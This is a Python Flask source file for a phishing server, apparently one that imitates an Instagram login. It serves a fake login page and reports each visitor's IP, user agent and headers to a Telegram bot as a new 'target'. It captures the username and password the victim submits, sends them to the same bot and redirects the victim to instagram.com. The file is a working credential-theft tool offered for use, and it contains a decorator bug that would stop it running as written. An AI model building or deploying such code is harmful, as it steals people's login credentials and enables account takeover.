from flask import (
    Flask as Flask,
    request as FlaskRequest,
    redirect as FlaskRedirect,
    render_template as FlaskRenderTemplate
)
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import requests
import time
import config

class UserDataHandler:
    def __init__(self):
        self.app = Flask(__name__, static_folder='static', template_folder='template')
        self.limiter = Limiter(get_remote_address, app=self.app)
        self.app.add_url_rule('/', 'index', self.__INDEX__, methods=['GET'])
        self.app.add_url_rule('/login', 'get_data', self.__GET_DATA__, methods=['POST'])

    def __SEND_DATA__(self, username, password):
        data = f"""
        🎉 The user has entered the information
        \n💌 USER NAME: {username}
        \n❗ PASSWORD: {password}
        \n🕛 Time: {time.strftime("%H:%M:%S")}
        \n⚜ Coded By: @zelroth
        """
        requests.get(f'https://api.telegram.org/bot{config.BOT_TOKEN}/sendMessage?chat_id={config.ADMIN}&text={data}')

    def __SEND_IP__(self):
        data = f"""
        New Target Added 💘
        \n⭕ IP: {FlaskRequest.remote_addr}
        \n🎃 User-Agent: {FlaskRequest.user_agent}
        \n🔱 Headers:\n {FlaskRequest.headers}
        \n🕛 Date: {time.strftime("%H:%M:%S")}
        \n⚜ Coded By: @zelroth
        """
        requests.get(f'https://api.telegram.org/bot{config.BOT_TOKEN}/sendMessage?chat_id={config.ADMIN}&text={data}')

    @limiter.limit('3/minute')
    def __INDEX__(self):
        self.__SEND_IP__()
        return FlaskRenderTemplate('login.html')

    @limiter.limit('3/minute')
    def __GET_DATA__(self):
        username = FlaskRequest.form['username']
        password = FlaskRequest.form['password']
        self.__SEND_DATA__(username, password)
        return FlaskRedirect('https://instagram.com')

if __name__ == "__main__":
    handler = UserDataHandler()
    handler.app.run('0.0.0.0', 8022)
